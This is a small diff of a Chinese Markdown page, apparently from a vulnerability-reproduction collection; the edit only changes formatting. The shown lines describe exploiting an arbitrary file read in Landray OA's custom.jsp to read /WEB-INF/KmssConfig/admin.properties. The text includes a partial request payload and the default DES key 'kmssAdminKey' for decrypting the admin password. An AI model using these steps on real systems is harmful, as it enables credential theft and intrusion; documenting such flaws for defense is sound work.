@@ -14,7 +14,7 @@
 
 ## 漏洞复现
 
-利用 **蓝凌OA custom.jsp 任意文件读取漏洞** 读取配置文件
+利用 `蓝凌OA custom.jsp 任意文件读取漏洞` 读取配置文件
 
 ```plain
 /WEB-INF/KmssConfig/admin.properties
@@ -37,7 +37,7 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
 
 
-获取password后，使用 DES方法 解密，默认密钥为 **kmssAdminKey**
+获取password后，使用 DES方法 解密，默认密钥为 `kmssAdminKey`
 
 ![img](../../../.vuepress/public/img/lanling-5.png)
 
